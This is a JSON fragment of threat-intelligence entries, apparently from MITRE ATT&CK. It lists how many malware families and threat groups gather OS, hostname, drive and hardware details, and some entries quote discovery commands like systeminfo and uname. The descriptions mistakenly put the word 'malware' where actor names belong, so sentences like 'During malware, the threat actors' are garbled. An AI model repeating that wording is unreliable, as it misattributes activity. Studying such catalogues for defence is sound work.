                "ID": "S0091",
                "Name": "Epic",
                "Description": "malware collects the OS version, hardware information, computer name, available system memory status, disk space information, and system and user language settings.[134]"
            },
            "S0568": {
                "ID": "S0568",
                "Name": "EVILNUM",
                "Description": "malware can obtain the computer name from the victim's system.[135]"
            },
            "S0569": {
                "ID": "S0569",
                "Name": "Explosive",
                "Description": "malware has collected the computer name from the infected host.[136]"
            },
            "S0181": {
                "ID": "S0181",
                "Name": "FALLCHILL",
                "Description": "malware can collect operating system (OS) version information, processor information, system name, and information about installed disks from the victim.[137]"
            },
            "S0512": {
                "ID": "S0512",
                "Name": "FatDuke",
                "Description": "malware can collect the user name, Windows version, computer name, and available space on discs from a compromised host.[138]"
            },
            "S0171": {
                "ID": "S0171",
                "Name": "Felismus",
                "Description": "malware collects the system information, including hostname and OS version, and sends it to the C2 server.[139]"
            },
            "S0267": {
                "ID": "S0267",
                "Name": "FELIXROOT",
                "Description": "malware collects the victim\u2019s computer name, processor architecture, OS version, volume serial number, and system type.[140][141]"
            },
            "S0679": {
                "ID": "S0679",
                "Name": "Ferocious",
                "Description": "malware can use GET.WORKSPACE in Microsoft Excel to determine the OS version of the compromised host.[142]"
            },
            "G1016": {
                "ID": "G1016",
                "Name": "FIN13",
                "Description": "malware has collected local host information by utilizing Windows commands systeminfo, fsutil, and fsinfo. malware has also utilized a compromised Symantex Altiris console and LanDesk account to retrieve host information.[143][144]"
            },
            "G0061": {
                "ID": "G0061",
                "Name": "FIN8",
                "Description": "malware has used PowerShell Scripts to check the architecture of a compromised machine before the selection of a 32-bit or 64-bit version of a malicious .NET loader.[145]"
            },
            "S0355": {
                "ID": "S0355",
                "Name": "Final1stspy",
                "Description": "malware obtains victim Microsoft Windows version information and CPU architecture.[146]"
            },
            "S0182": {
                "ID": "S0182",
                "Name": "FinFisher",
                "Description": "malware checks if the victim OS is 32 or 64-bit.[147][148]"
            },
            "S0381": {
                "ID": "S0381",
                "Name": "FlawedAmmyy",
                "Description": "malware can collect the victim's operating system and computer name during the initial infection.[149]"
            },
            "C0001": {
                "ID": "C0001",
                "Name": "Frankenstein",
                "Description": "During malware, the threat actors used Empire to obtain the compromised machine's name.[133]"
            },
            "S1044": {
                "ID": "S1044",
                "Name": "FunnyDream",
                "Description": "malware can enumerate all logical drives on a targeted machine.[150]"
            },
            "C0007": {
                "ID": "C0007",
                "Name": "FunnyDream",
                "Description": "During malware, the threat actors used Systeminfo to collect information on targeted hosts.[150]"
            },
            "S0410": {
                "ID": "S0410",
                "Name": "Fysbis",
                "Description": "malware has used the command ls /etc | egrep -e\"fedora*|debian*|gentoo*|mandriva*|mandrake*|meego*|redhat*|lsb-*|sun-*|SUSE*|release\" to determine which Linux OS version is running.[151]"
            },
            "G0047": {
                "ID": "G0047",
                "Name": "Gamaredon Group",
                "Description": "A malware file stealer can gather the victim's computer name and drive serial numbers to send to a C2 server.[152][153][154]"
            },
            "S0666": {
                "ID": "S0666",
                "Name": "Gelsemium",
                "Description": "malware can determine the operating system and whether a targeted machine has a 32 or 64 bit architecture.[94]"
            },
            "S0460": {
                "ID": "S0460",
                "Name": "Get2",
                "Description": "malware has the ability to identify the computer name and Windows version of an infected host.[155]"
            },
            "S0032": {
                "ID": "S0032",
                "Name": "gh0st RAT",
                "Description": "malware has gathered system architecture, processor, OS configuration, and installed hardware information.[156]"
            },
            "S0249": {
                "ID": "S0249",
                "Name": "Gold Dragon",
                "Description": "malware collects endpoint information using the systeminfo command.[73]"
            },
            "S0493": {
                "ID": "S0493",
                "Name": "GoldenSpy",
                "Description": "malware has gathered operating system information.[157]"
            },
            "S0531": {
                "ID": "S0531",
                "Name": "Grandoreiro",
                "Description": "malware can collect the computer name and OS version from a compromised host.[158]"
            },
            "S0237": {
                "ID": "S0237",
                "Name": "GravityRAT",
                "Description": "malware collects the MAC address, computer name, and CPU information.[159]"
            },
            "S0690": {
                "ID": "S0690",
                "Name": "Green Lambert",
                "Description": "malware can use uname to identify the operating system name, version, and processor type.[160][161]"
            },
            "S0417": {
                "ID": "S0417",
                "Name": "GRIFFON",
                "Description": "malware has used a reconnaissance module that can be used to retrieve information about a victim's computer, including the resolution of the workstation .[162]"
            },
            "S0632": {
                "ID": "S0632",
                "Name": "GrimAgent",
                "Description": "malware can collect the OS, and build version on a compromised host.[163]"
            },
            "S0151": {
                "ID": "S0151",
                "Name": "HALFBAKED",
                "Description": "malware can obtain information about the OS, processor, and BIOS.[164]"
            },
            "S0214": {
                "ID": "S0214",
                "Name": "HAPPYWORK",
                "Description": "can collect system information, including computer name, system manufacturer, IsDebuggerPresent state, and execution path.[165]"
            },
            "S0391": {
                "ID": "S0391",
                "Name": "HAWKBALL",
                "Description": "malware can collect the OS version, architecture information, and computer name.[166]"
            },
            "S0617": {
                "ID": "S0617",
                "Name": "HELLOKITTY",
                "Description": "malware can enumerate logical drives on a target system.[116]"
            },
            "S0697": {
                "ID": "S0697",
                "Name": "HermeticWiper",
                "Description": "malware can determine the OS version, bitness, and enumerate physical drives on a targeted host.[167][168][169][170]"
            },
            "G1001": {
                "ID": "G1001",
                "Name": "HEXANE",
                "Description": "malware has collected the hostname of a compromised machine.[171]"
            },
            "S1027": {
                "ID": "S1027",
                "Name": "Heyoka Backdoor",
                "Description": "malware can enumerate drives on a compromised host.[172]"
            },
            "G0126": {
                "ID": "G0126",
                "Name": "Higaisa",
                "Description": "malware collected the system volume serial number, GUID, and computer name.[173][174]"
            },
            "S0601": {
                "ID": "S0601",
                "Name": "Hildegard",
                "Description": "malware has collected the host's OS, CPU, and memory information.[175]"
            },
            "S0376": {
                "ID": "S0376",
                "Name": "HOPLIGHT",
                "Description": "malware has been observed collecting victim machine information like OS version, volume information, and more.[176]"
            },
            "S0431": {
                "ID": "S0431",
                "Name": "HotCroissant",
                "Description": "malware has the ability to determine if the current user is an administrator, Windows product name, processor name, screen resolution, and physical RAM of the infected host.[177]"
            },
            "S0203": {
                "ID": "S0203",
                "Name": "Hydraq",
                "Description": "malware creates a backdoor through which remote attackers can retrieve information such as computer name, OS version, processor speed, memory size, and CPU speed.[178]"
            },
            "S1022": {
                "ID": "S1022",
                "Name": "IceApple",
                "Description": "The malware Server Variable Dumper module iterates over all server variables present for the current request and returns them to the adversary.[179]"
            },
            "S0483": {
                "ID": "S0483",
                "Name": "IcedID",
                "Description": "malware has the ability to identify the computer name and OS version on a compromised host.[180]"
            },
            "G0100": {
                "ID": "G0100",
                "Name": "Inception",
                "Description": "malware has used a reconnaissance module to gather information about the operating system and hardware on the infected host.[181]"
            },
            "S0604": {
                "ID": "S0604",
                "Name": "Industroyer",
                "Description": "malware collects the victim machine\u2019s Windows GUID.[182]"
            },
            "S0259": {
                "ID": "S0259",
                "Name": "InnaputRAT",
                "Description": "malware gathers volume drive information and system information.[183]"
            },
            "S0260": {
                "ID": "S0260",
                "Name": "InvisiMole",
                "Description": "malware can gather information on the mapped drives, OS version, computer name, DEP policy, memory size, and system volume serial number.[184][185]"
            },
            "S0015": {
                "ID": "S0015",
                "Name": "Ixeshe",
                "Description": "malware collects the computer name of the victim's system during the initial infection.[186]"
            },
            "S0044": {
                "ID": "S0044",
                "Name": "JHUHUGIT",
                "Description": "malware obtains a build identifier as well as victim hard drive information from Windows registry key HKLM\\SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum. Another malware variant gathers the victim storage volume serial number and the storage device name.[187][188]"
            },
            "S0201": {
                "ID": "S0201",
                "Name": "JPIN",
                "Description": "malware can obtain system information such as OS version and disk space.[189]"
            },
            "S0283": {
                "ID": "S0283",
                "Name": "jRAT",
                "Description": "malware collects information about the OS (version, build type, install date) as well as system up-time upon receiving a connection from a backdoor.[190]"
            },
            "S0215": {
                "ID": "S0215",
                "Name": "KARAE",
                "Description": "malware can collect system information.[165]"
            },
            "S0088": {
                "ID": "S0088",
                "Name": "Kasidet",
                "Description": "malware has the ability to obtain a victim's system name and operating system version.[191]"
            },
            "S0265": {
                "ID": "S0265",
                "Name": "Kazuar",
                "Description": "malware gathers information on the system and local drives.[192]"
            },
            "G0004": {
                "ID": "G0004",
                "Name": "Ke3chang",
                "Description": "malware performs operating system information discovery using systeminfo and has used implants to identify the system language and computer name.[193][194][195]"
            },
            "S0585": {
                "ID": "S0585",
                "Name": "Kerrdown",
                "Description": "malware has the ability to determine if the compromised host is running a 32 or 64 bit OS architecture.[196]"
            },
            "S0487": {
                "ID": "S0487",
                "Name": "Kessel",
                "Description": "malware has collected the system architecture, OS version, and MAC address information.[71]"
            },
            "S1020": {
                "ID": "S1020",
                "Name": "Kevin",
                "Description": "malware can enumerate the OS version and hostname of a targeted machine.[171]"
            },
            "S0387": {
                "ID": "S0387",
                "Name": "KeyBoy",
                "Description": "malware can gather extended system information, such as information about the operating system, disks, and memory.[197][198]"
            },
            "S0271": {
                "ID": "S0271",
                "Name": "KEYMARBLE",
                "Description": "malware has the capability to collect the computer name, language settings, the OS version, CPU information, disk devices, and time elapsed since system start.[199]"
            },
            "S0526": {
                "ID": "S0526",
                "Name": "KGH_SPY",
                "Description": "malware can collect drive information from a compromised host.[200]"
            },
            "S0607": {
                "ID": "S0607",
                "Name": "KillDisk",
                "Description": "malware retrieves the hard disk name by calling the CreateFileA to \\.\\PHYSICALDRIVE0 API.[201]"
            },
            "G0094": {
                "ID": "G0094",
                "Name": "Kimsuky",
                "Description": "malware has enumerated drives, OS type, OS version, and other information using a script or the \"systeminfo\" command.[202][203]"
            },
            "S0250": {
                "ID": "S0250",
                "Name": "Koadic",
                "Description": "malware can obtain the OS version and build, computer name, and processor architecture from a compromised host.[204]"
            },
            "S0641": {
                "ID": "S0641",
                "Name": "Kobalos",
                "Description": "malware can record the hostname and kernel version of the target machine.[205]"
            },
            "S0669": {
                "ID": "S0669",
                "Name": "KOCTOPUS",
                "Description": "malware has checked the OS version using wmic.exe and the find command.[204]"
            },
            "S0156": {
                "ID": "S0156",
                "Name": "KOMPROGO",
                "Description": "malware is capable of retrieving information about the infected system.[206]"
            },
            "S0356": {
                "ID": "S0356",
                "Name": "KONNI",
                "Description": "malware can gather the OS version, architecture information, connected drives, hostname, RAM size, and disk space information from the victim\u2019s machine and has used cmd /c systeminfo command to get a snapshot of the current system state of the target machine.[207][208][209]"
            },
            "S1075": {
                "ID": "S1075",
                "Name": "KOPILUWAK",
                "Description": "malware can discover logical drive information on compromised hosts.[210]"
            },
            "S0236": {
                "ID": "S0236",
                "Name": "Kwampirs",
                "Description": "malware collects OS version information such as registered owner details, manufacturer details, processor type, available storage, installed patches, hostname, version info, system date, and other system information by using the commands systeminfo, net config workstation, hostname, ver, set, and date /t.[211]"
            },
            "G0032": {
                "ID": "G0032",
                "Name": "Lazarus Group",
                "Description": "Several malware malware families collect information on the type and version of the victim OS, as well as the victim computer name and CPU information. A Destover-like variant used by malware also collects disk space information and sends it to its C2 server.[212][213][214][215][216][217]"
            },
            "S0395": {
                "ID": "S0395",
                "Name": "LightNeuron",
                "Description": "malware gathers the victim computer name using the Win32 API call GetComputerName.[218]"
            },
            "S0211": {
                "ID": "S0211",
                "Name": "Linfo",
                "Description": "malware creates a backdoor through which remote attackers can retrieve system information.[219]"
            },
            "S0513": {
                "ID": "S0513",
                "Name": "LiteDuke",
                "Description": "malware can enumerate the CPUID and BIOS version on a compromised system.[138]"
            },
            "S0680": {
                "ID": "S0680",
                "Name": "LitePower",
                "Description": "malware has the ability to list local drives and enumerate the OS architecture.[142]"
            },
            "S1121": {
                "ID": "S1121",
                "Name": "LITTLELAMB.WOOLTEA",
                "Description": "malware can check the type of Ivanti VPN device it is running on by executing first_run() to identify the first four bytes of the motherboard serial number.[220]"
            },
            "S0681": {
                "ID": "S0681",
                "Name": "Lizar",
                "Description": "malware can collect the computer name from the machine,.[221]"
            },
            "S0447": {
                "ID": "S0447",
                "Name": "Lokibot",
                "Description": "malware has the ability to discover the computer name and Windows product name/version.[222]"
            },
            "S0451": {
                "ID": "S0451",
                "Name": "LoudMiner",
                "Description": "malware has monitored CPU usage.[223]"
            },
            "S0532": {
                "ID": "S0532",
                "Name": "Lucifer",
                "Description": "malware can collect the computer name, system architecture, default language, and processor frequency of a compromised host.[224]"
            },
            "S0409": {
                "ID": "S0409",
                "Name": "Machete",
                "Description": "malware collects the hostname of the target computer.[225]"
            },
            "S1016": {
                "ID": "S1016",
                "Name": "MacMa",
                "Description": "malware can collect information about a compromised computer, including: Hardware UUID, Mac serial number, macOS version, and disk sizes.[226]"
            },
            "S1048": {
                "ID": "S1048",
                "Name": "macOS.OSAMiner",
                "Description": "malware can gather the device serial number and has checked to ensure there is enough disk space using the Unix utility df.[227]"
            },
            "S1060": {
                "ID": "S1060",
                "Name": "Mafalda",
                "Description": "malware can collect the computer name and enumerate all drives on a compromised host.[228][229]"
            },
            "G0059": {
                "ID": "G0059",
                "Name": "Magic Hound",
                "Description": "malware malware has used a PowerShell command to check the victim system architecture to determine if it is an x64 machine. Other malware has obtained the OS version, UUID, and computer/host name to send to the C2 server.[230][231][232]"
            },
            "G1026": {
                "ID": "G1026",
                "Name": "Malteiro",
                "Description": "malware collects the machine information, system architecture, the OS version, computer name, and Windows product name.[233]"
            },
            "S0652": {
                "ID": "S0652",
                "Name": "MarkiRAT",
                "Description": "malware can obtain the computer name from a compromised host.[234]"
            },
            "S0449": {
                "ID": "S0449",
                "Name": "Maze",
                "Description": "malware has checked the language of the infected system using the \"GetUSerDefaultUILanguage\" function.[235]"
            },
            "S1059": {
                "ID": "S1059",
                "Name": "metaMain",
                "Description": "malware can collect the computer name from a compromised host.[229]"
            },
            "S0455": {
                "ID": "S0455",
                "Name": "Metamorfo",
                "Description": "malware has collected the hostname and operating system version from the compromised host.[236][237][238]"
            },
            "S0688": {
                "ID": "S0688",
                "Name": "Meteor",
                "Description": "malware has the ability to discover the hostname of a compromised host.[239]"
            },
            "S0339": {
                "ID": "S0339",
                "Name": "Micropsia",
                "Description": "malware gathers the hostname and OS version from the victim\u2019s machine.[240][241]"
            },
            "S1015": {
                "ID": "S1015",
                "Name": "Milan",
                "Description": "malware can enumerate the targeted machine's name and GUID.[242][243]"
            },
            "S0051": {
                "ID": "S0051",
                "Name": "MiniDuke",
                "Description": "malware can gather the hostname on a compromised machine.[138]"
            },
            "S0280": {
                "ID": "S0280",
                "Name": "MirageFox",
                "Description": "malware can collect CPU and architecture information from the victim\u2019s machine.[244]"
            },
            "S0084": {
                "ID": "S0084",
                "Name": "Mis-Type",
                "Description": "The initial beacon packet for malware contains the operating system version and file system of the victim.[245]"
            },
            "S0083": {
                "ID": "S0083",
                "Name": "Misdat",
                "Description": "The initial beacon packet for malware contains the operating system version of the victim.[245]"
            },
            "S1122": {
                "ID": "S1122",
                "Name": "Mispadu",
                "Description": "malware collects the OS version, computer name, and language ID.[246]"
            },
            "S0079": {
                "ID": "S0079",
                "Name": "MobileOrder",
                "Description": "malware has a command to upload to its C2 server victim mobile device information, including IMEI, IMSI, SIM card serial number, phone number, Android version, and other information.[247]"
            },
            "S0553": {
                "ID": "S0553",
                "Name": "MoleNet",
                "Description": "malware can collect information about the about the system.[123]"
            },
            "S1026": {
                "ID": "S1026",
                "Name": "Mongall",
                "Description": "malware can identify drives on compromised hosts and retrieve the hostname via gethostbyname.[172]"
            },
            "S0149": {
                "ID": "S0149",
                "Name": "MoonWind",
                "Description": "malware can obtain the victim hostname, Windows version, RAM amount, number of drives, and screen resolution.[248]"
            },
            "S0284": {
                "ID": "S0284",
                "Name": "More_eggs",
                "Description": "malware has the capability to gather the OS version and computer name.[249][250]"
            },
            "G1009": {
                "ID": "G1009",
                "Name": "Moses Staff",
                "Description": "malware collected information about the infected host, including the machine names and OS architecture.[251]"
            },
            "G0069": {
                "ID": "G0069",
                "Name": "MuddyWater",
                "Description": "malware has used malware that can collect the victim\u2019s OS version and machine name.[252][253][254][255][256]"
            },
            "S0233": {
                "ID": "S0233",
                "Name": "MURKYTOP",
                "Description": "malware has the capability to retrieve information about the OS.[257]"
            },
            "G0129": {
                "ID": "G0129",
                "Name": "Mustang Panda",
                "Description": "malware has gathered system information using systeminfo.[258]"
            },
            "G1020": {
                "ID": "G1020",
                "Name": "Mustard Tempest",
                "Description": "malware has used implants to perform system reconnaissance on targeted systems.[259]"
            },
            "S0205": {
                "ID": "S0205",
                "Name": "Naid",
                "Description": "malware collects a unique identifier (UID) from a compromised host.[260]"
            },
            "S0228": {
                "ID": "S0228",
                "Name": "NanHaiShu",
                "Description": "malware can gather the victim computer name and serial number.[261]"
            },
            "S0247": {
                "ID": "S0247",
                "Name": "NavRAT",
                "Description": "malware uses systeminfo on a victim\u2019s machine.[262]"
            },
            "S0272": {
                "ID": "S0272",
                "Name": "NDiskMonitor",
                "Description": "malware obtains the victim computer name and encrypts the information to send over its C2 channel.[263]"
            },
            "S0630": {
                "ID": "S0630",
                "Name": "Nebulae",
                "Description": "malware can discover logical drive information including the drive type, free space, and volume information.[264]"
            },
            "S0691": {
                "ID": "S0691",
                "Name": "Neoichor",
                "Description": "malware can collect the OS version and computer name from a compromised host.[195]"
            },
            "S0457": {
                "ID": "S0457",
                "Name": "Netwalker",
                "Description": "malware can determine the system architecture it is running on to choose which version of the DLL to use.[265]"
            },
            "S0198": {
                "ID": "S0198",
                "Name": "NETWIRE",
                "Description": "malware can discover and collect victim system information.[266]"
            },
            "S1100": {
                "ID": "S1100",
                "Name": "Ninja",
                "Description": "malware can obtain the computer name and information on the OS and physical drives from targeted hosts.[267][268]"
            },
            "S0385": {
                "ID": "S0385",
                "Name": "njRAT",
                "Description": "malware enumerates the victim operating system and computer name during the initial infection.[269]"
            },
            "S1107": {
                "ID": "S1107",
                "Name": "NKAbuse",
                "Description": "malware conducts multiple system checks and includes these in subsequent \"heartbeat\" messages to the malware's command and control server.[270]"
            },
            "S0353": {
                "ID": "S0353",
                "Name": "NOKKI",
                "Description": "malware can gather information on drives and the operating system on the victim\u2019s machine.[271]"
            },
            "S0644": {
                "ID": "S0644",
                "Name": "ObliqueRAT",
                "Description": "malware has the ability to check for blocklisted computer names on infected endpoints.[272]"
            },
            "S0346": {
                "ID": "S0346",
                "Name": "OceanSalt",
                "Description": "malware can collect the computer name from the system.[273]"
            },
            "S0340": {
                "ID": "S0340",
                "Name": "Octopus",
                "Description": "malware can collect system drive information, the computer name, the size of the disk, OS version, and OS architecture information.[274]"
            },
            "G0049": {
                "ID": "G0049",
                "Name": "OilRig",
                "Description": "malware has run hostname and systeminfo on a victim.[275][276][277][278]"
            },
            "S0439": {
                "ID": "S0439",
                "Name": "Okrum",
                "Description": "malware can collect computer name, locale information, and information about the OS and architecture.[279]"
            },
            "S0264": {
                "ID": "S0264",
                "Name": "OopsIE",
                "Description": "malware checks for information on the CPU fan, temperature, mouse, hard disk, and motherboard as part of its anti-VM checks.[280]"
            },
            "C0012": {
                "ID": "C0012",
                "Name": "Operation CuckooBees",
                "Description": "During malware, the threat actors used the systeminfo command to gather details about a compromised system.[281]"
            },
            "C0006": {
                "ID": "C0006",
                "Name": "Operation Honeybee",
                "Description": "During malware, the threat actors collected the computer name, OS, and other system information using cmd /c systeminfo > %temp%\\ temp.ini.[282]"
            },
            "C0014": {
                "ID": "C0014",
                "Name": "Operation Wocao",
                "Description": "During malware, threat actors discovered the local disks attached to the system and their hardware information including manufacturer and model, as well as the OS versions of systems connected to a targeted network.[283]"
            },
            "S0229": {
                "ID": "S0229",
                "Name": "Orz",
                "Description": "malware can gather the victim OS version and whether it is 64 or 32 bit.[261]"
            },
            "S0165": {
                "ID": "S0165",
                "Name": "OSInfo",
                "Description": "malware discovers information about the infected machine.[24]"
            },
            "S0402": {
                "ID": "S0402",
                "Name": "OSX/Shlayer",
                "Description": "malware has collected the IOPlatformUUID, session UID, and the OS version using the command sw_vers -productVersion.[284][285]"
            },
            "S0352": {
                "ID": "S0352",
                "Name": "OSX_OCEANLOTUS.D",
                "Description": "malware collects processor information, memory information, computer name, hardware UUID, serial number, and operating system version. malware has used the ioreg command to gather some of this information.[286][287][3]"
            },
            "S0208": {
                "ID": "S0208",
                "Name": "Pasam",
                "Description": "malware creates a backdoor through which remote attackers can retrieve information such as hostname and free disk space.[288]"
            },
            "G0040": {
                "ID": "G0040",
                "Name": "Patchwork",
                "Description": "malware collected the victim computer name, OS version, and architecture type and sent the information to its C2 server. malware also enumerated all available drives on the victim's machine.[289][263]"
            },
            "S0556": {
                "ID": "S0556",
                "Name": "Pay2Key",
                "Description": "malware has the ability to gather the hostname of the victim machine.[290]"
            },
            "S0587": {
                "ID": "S0587",
                "Name": "Penquin",
                "Description": "malware can report the file system type and disk space of a compromised host to C2.[291]"
            },
            "S0048": {
                "ID": "S0048",
                "Name": "PinchDuke",
                "Description": "malware gathers system configuration information.[292]"
            },
            "S1031": {
                "ID": "S1031",
                "Name": "PingPull",
                "Description": "malware can retrieve the hostname of a compromised host.[293]"
            },
            "S0501": {
                "ID": "S0501",
                "Name": "PipeMon",
                "Description": "malware can collect and send OS version and computer name as a part of its C2 beacon.[294]"
            },
            "S0124": {
                "ID": "S0124",
                "Name": "Pisloader",
                "Description": "malware has a command to collect victim system information, including the system name and OS version.[295]"
            },
            "S0254": {
                "ID": "S0254",
                "Name": "PLAINTEE",
                "Description": "malware collects general system enumeration data about the infected machine and checks the OS version.[296]"
            },
            "S0428": {
                "ID": "S0428",
                "Name": "PoetRAT",
                "Description": "malware has the ability to gather information about the compromised host.[297]"
            },
            "S0453": {
                "ID": "S0453",
                "Name": "Pony",
                "Description": "malware has collected the Service Pack, language, and region information to send to the C2.[298]"
            },
            "S0216": {
                "ID": "S0216",
                "Name": "POORAIM",
                "Description": "malware can identify system information, including battery status.[165]"
            },
            "S0378": {
                "ID": "S0378",
                "Name": "PoshC2",
                "Description": "malware contains modules, such as Get-ComputerInfo, for enumerating common system information.[299]"
            },
            "S0139": {
                "ID": "S0139",
                "Name": "PowerDuke",
                "Description": "malware has commands to get information about the victim's name, build, version, serial number, and memory usage.[300]"
            },
            "S0441": {
                "ID": "S0441",
                "Name": "PowerShower",
                "Description": "malware has collected system information on the infected host.[301]"
            },
            "S0223": {
                "ID": "S0223",
                "Name": "POWERSTATS",
                "Description": "malware can retrieve OS name/architecture and computer/domain name information from compromised hosts.[302][303]"
            },
            "S0184": {
                "ID": "S0184",
                "Name": "POWRUNER",
                "Description": "malware may collect information about the system by running hostname and systeminfo on a victim.[304]"
            },
            "S0113": {
                "ID": "S0113",
                "Name": "Prikormka",
                "Description": "A module in malware collects information from the victim about Windows OS version, computer name, battery info, and physical memory.[305]"
            },
            "S0238": {
                "ID": "S0238",
                "Name": "Proxysvc",
                "Description": "malware collects the OS version, country name, MAC address, computer name, physical memory statistics, and volume information for all drives on the system.[216]"
            },
            "S0196": {
                "ID": "S0196",
                "Name": "PUNCHBUGGY",
                "Description": "malware can gather system information such as computer names.[306]"
            },
            "S0192": {
                "ID": "S0192",
                "Name": "Pupy",
                "Description": "malware can grab a system\u2019s information including the OS version, architecture, etc.[307]"
            },
            "S0650": {
                "ID": "S0650",
                "Name": "QakBot",
                "Description": "malware can collect system information including the OS version and domain on a compromised host.[308][309][310][259]"
            },
            "S0262": {
                "ID": "S0262",
                "Name": "QuasarRAT",
                "Description": "malware can gather system information from the victim\u2019s machine including the OS type.[311]"
            },
            "S0458": {
                "ID": "S0458",
                "Name": "Ramsay",
                "Description": "malware can detect system information--including disk names, total space, and remaining space--to create a hardware profile GUID which acts as a system identifier for operators.[312][313]"
            },
            "S0241": {
                "ID": "S0241",
                "Name": "RATANKBA",
                "Description": "malware gathers information about the OS architecture, OS name, and OS version/Service pack.[314][315]"
            },
            "S0662": {
                "ID": "S0662",
                "Name": "RCSession",
                "Description": "malware can gather system information from a compromised host.[316]"
            },
            "S0172": {
                "ID": "S0172",
                "Name": "Reaver",
                "Description": "malware collects system information from the victim, including CPU speed, computer name, volume serial number, ANSI code page, OEM code page identifier for the OS, Microsoft Windows version, and memory information.[317]"
            },
            "S0153": {
                "ID": "S0153",
                "Name": "RedLeaves",
                "Description": "malware can gather extended system information including the hostname, OS version number, platform, memory information, time elapsed since system startup, and CPU information.[92][318]"
            },
            "S0125": {
                "ID": "S0125",
                "Name": "Remsec",
                "Description": "malware can obtain the OS version information, computer name, processor architecture, machine role, and OS edition.[319]"
            },
            "S0379": {
                "ID": "S0379",
                "Name": "Revenge RAT",
                "Description": "malware collects the CPU information, OS information, and system language.[320]"
            },
            "S0496": {
                "ID": "S0496",
                "Name": "REvil",
                "Description": "malware can identify the username, machine name, system language, keyboard layout, OS version, and system drive information on a compromised host.[321][322][323][324][324][325][326][327]"
            },
            "S0433": {
                "ID": "S0433",
                "Name": "Rifdoor",
                "Description": "malware has the ability to identify the Windows version on the compromised host.[328]"
            },
            "S0448": {
                "ID": "S0448",
                "Name": "Rising Sun",
                "Description": "malware can detect the computer name, operating system, and drive information, including drive type, total number of bytes on disk, total number of free bytes on disk, and name of a specified volume.[329]"
            },
            "G0106": {
                "ID": "G0106",
                "Name": "Rocke",
                "Description": "malware has used uname -m to collect the name and information about the infected system's kernel.[330]"
            },
            "S0270": {
                "ID": "S0270",
                "Name": "RogueRobin",
                "Description": "malware gathers BIOS versions and manufacturers, the number of CPU cores, the total physical memory, and the computer name.[331]"
            },
            "S0240": {
                "ID": "S0240",
                "Name": "ROKRAT",
                "Description": "malware can gather the hostname and the OS version to ensure it doesn\u2019t run on a Windows XP or Windows Server 2003 systems.[332][333][334][335][336][337]"
            },
            "S1078": {
                "ID": "S1078",
                "Name": "RotaJakiro",
                "Description": "malware executes a set of commands to collect device information, including uname.  Another example is the cat /etc/*release | uniq command used to collect the current OS distribution.[338]"
            },
            "S1073": {
                "ID": "S1073",
                "Name": "Royal",
                "Description": "malware can use GetNativeSystemInfo and GetLogicalDrives to enumerate system processors and logical drives.[339][340]"
            },
            "S0148": {
                "ID": "S0148",
                "Name": "RTM",
                "Description": "malware can obtain the computer name, OS version, and default language identifier.[341]"
            },
            "S0253": {
                "ID": "S0253",
                "Name": "RunningRAT",
                "Description": "malware gathers the OS version, logical drives information, processor information, and volume information.[73]"
            },
            "S0446": {
                "ID": "S0446",
                "Name": "Ryuk",
                "Description": "malware has called GetLogicalDrives to emumerate all mounted drives, and GetDriveTypeW to determine the drive type.[342]"
            },
            "S0085": {
                "ID": "S0085",
                "Name": "S-Type",
                "Description": "The initial beacon packet for malware contains the operating system version and file system of the victim.[245]"
            },
            "S1018": {
                "ID": "S1018",
                "Name": "Saint Bot",
                "Description": "malware can identify the OS version, CPU, and other details from a victim's machine.[343]"
            },
            "G0034": {
                "ID": "G0034",
                "Name": "Sandworm Team",
                "Description": "malware used a backdoor to enumerate information about the infected system's operating system.[344][345]"
            },
            "S1085": {
                "ID": "S1085",
                "Name": "Sardonic",
                "Description": "malware has the ability to collect the computer name, CPU manufacturer name, and C:\\ drive serial number from a compromised machine. malware also has the ability to execute the ver and systeminfo commands.[346]"
            },
            "S0461": {
                "ID": "S0461",
                "Name": "SDBbot",
                "Description": "malware has the ability to identify the OS version, OS bit information and computer name.[155][16]"
            },
            "S0382": {
                "ID": "S0382",
                "Name": "ServHelper",
                "Description": "malware will attempt to enumerate Windows version and system architecture.[347]"
            },
            "S0596": {
                "ID": "S0596",
                "Name": "ShadowPad",
                "Description": "malware has discovered system information including memory status, CPU frequency, OS versions, and volume serial numbers.[348]"
            },
            "S0140": {
                "ID": "S0140",
                "Name": "Shamoon",
                "Description": "malware obtains the victim's operating system version and keyboard layout and sends the information to the C2 server.[349][350]"
            },
            "S1019": {
                "ID": "S1019",
                "Name": "Shark",
                "Description": "malware can collect the GUID of a targeted machine.[242][243]"
            },
            "S1089": {
                "ID": "S1089",
                "Name": "SharpDisco",
                "Description": "malware can use a plugin to enumerate system drives.[351]"
            },
            "S0546": {
                "ID": "S0546",
                "Name": "SharpStage",
                "Description": "malware has checked the system settings to see if Arabic is the configured language.[352]"
            },
            "S0450": {
                "ID": "S0450",
                "Name": "SHARPSTATS",
                "Description": "malware has the ability to identify the IP address, machine name, and OS of the compromised host.[303]"
            },
            "S0445": {
                "ID": "S0445",
                "Name": "ShimRatReporter",
                "Description": "malware gathered the operating system name and specific Windows version of an infected machine.[353]"
            },
            "S0217": {
                "ID": "S0217",
                "Name": "SHUTTERSPEED",
                "Description": "malware can collect system information.[165]"
            },
            "G1008": {
                "ID": "G1008",
                "Name": "SideCopy",
                "Description": "malware has identified the OS version of a compromised host.[8]"
            },
            "S0610": {
                "ID": "S0610",
                "Name": "SideTwist",
                "Description": "malware can collect the computer name of a targeted system.[278]"
            },
            "G0121": {
                "ID": "G0121",
                "Name": "Sidewinder",
                "Description": "malware has used tools to collect the computer name, OS version, installed hotfixes, as well as information regarding the memory and processor on a compromised host.[354][355]"
            },
            "S0692": {
                "ID": "S0692",
                "Name": "SILENTTRINITY",
                "Description": "malware can collect information related to a compromised host, including OS version and a list of drives.[356]"
            },
            "S0468": {
                "ID": "S0468",
                "Name": "Skidmap",
                "Description": "malware has the ability to check whether the infected system\u2019s OS is Debian or RHEL/CentOS to determine which cryptocurrency miner it should use.[357]"
            },
            "S0533": {
                "ID": "S0533",
                "Name": "SLOTHFULMEDIA",
                "Description": "malware has collected system name, OS version, adapter information, memory usage, and disk information from a victim machine.[358]"
            },
            "S0218": {
                "ID": "S0218",
                "Name": "SLOWDRIFT",
                "Description": "malware collects and sends system information to its C2.[165]"
            },
            "S0649": {
                "ID": "S0649",
                "Name": "SMOKEDHAM",
                "Description": "malware has used the systeminfo command on a compromised host.[359]"
            },
            "S1086": {
                "ID": "S1086",
                "Name": "Snip3",
                "Description": "malware has the ability to query Win32_ComputerSystem for system information. [360]"
            },
            "S1124": {
                "ID": "S1124",
                "Name": "SocGholish",
